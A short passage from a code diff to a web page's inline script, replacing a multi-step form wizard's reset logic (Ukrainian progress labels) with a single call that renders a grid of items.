-      for (let i = 1; i <= totalSteps; i++) {
-        document.getElementById(`step-${i}`).classList.add('hidden');
-      }
-      document.getElementById('step-1').classList.remove('hidden');
-
-      document.getElementById('progress-bar').style.width = '33%';
-      document.getElementById('progress-label').innerText = 'Крок 1 з 3';
-      document.getElementById('progress-percent').innerText = '33%';
-
-      document.getElementById('prev-btn').classList.add('hidden');
-      document.getElementById('next-btn').innerText = 'Далі';
-    }
-  </script>
+        // Первичный рендер
+        renderGrid(items);
+    </script>
 </body>
 </html>
